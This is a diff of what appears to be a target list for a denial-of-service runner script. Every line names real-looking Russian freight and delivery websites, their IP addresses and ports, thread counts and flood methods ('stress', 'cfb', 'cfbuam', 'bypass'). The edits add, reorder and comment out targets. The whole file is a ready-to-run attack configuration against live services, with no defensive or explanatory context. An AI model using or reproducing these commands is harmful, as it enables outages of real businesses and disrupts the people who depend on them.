@@ -16,11 +16,16 @@
 ###Везёт всем - онлайн-сервис по грузоперевозкам.
 #runner.py https://vezetvsem.ru/ https://frontend.vezetvsem.ru/ 89.108.106.50:80 89.108.106.50:443 https://89.108.106.50:443 tcp://89.108.106.50:22 tcp://89.108.106.50:80 tcp://89.108.106.50:443 -t 2000 --http-methods get stress head bypass
 
-runner.py https://cargocash.ru/ http://cargocash.ru/ http://188.225.36.11:443 tcp://188.225.36.11:443 -t 1000 --http-methods stress cfb
+https://ekdostavka.ru http://ekdostavka.ru 94.250.254.110:80 94.250.254.110:443 https://94.250.254.110:443 udp://94.250.254.110:53 tcp://94.250.254.110:21 tcp://94.250.254.110:22 tcp://94.250.254.110:80 tcp://94.250.254.110:443 tcp://94.250.254.110:53  -t 3000 --http-methods stress get head
 
-runner.py https://cdek.ru/ http://cdek.ru/ -t 500 --http-methods get stress head
-#runner.py http://78.46.28.63:80 http://78.46.28.63:443 udp://82.202.192.244:123 -t 500 --http-methods stress head
-runner.py https://broniboy.ru https://broniboy.ru/samara/restaurants/ 185.137.235.138:80 185.137.235.138:443 https://185.137.235.138:443 https://185.137.235.138:8433 tcp://185.137.235.138:22 tcp://185.137.235.138:53 tcp://185.137.235.138:80 tcp://185.137.235.138:443 -t 1000 --http-methods stress get head
+https://cargocash.ru/ http://cargocash.ru/ http://188.225.36.11:443 tcp://188.225.36.11:443 -t 1000 --http-methods stress cfb
+
+https://cdek.ru/ http://cdek.ru/ -t 500 --http-methods get stress head
+
+http://78.46.28.63:80 http://78.46.28.63:443 -t 500 --http-methods stress head
+
+
+#runner.py https://broniboy.ru https://broniboy.ru/samara/restaurants/ 185.137.235.138:80 185.137.235.138:443 https://185.137.235.138:443 https://185.137.235.138:8433 tcp://185.137.235.138:22 tcp://185.137.235.138:53 tcp://185.137.235.138:80 tcp://185.137.235.138:443 -t 1000 --http-methods stress get head
 
 #runner.py https://groozgo.ru/ http://groozgo.ru/ 188.114.96.3:80 188.114.96.3:8080 188.114.96.3:443 188.114.96.3:8443 188.114.97.2:80 188.114.97.2:443 https://188.114.97.2:443 188.114.97.2:8080 https://188.114.97.2:8443 188.114.96.2:80 188.114.96.2:443 188.114.96.2:8443 https://188.114.96.2:443 https://188.114.96.2:8443 -t 2000 --http-methods cfb cfbuam stress
 
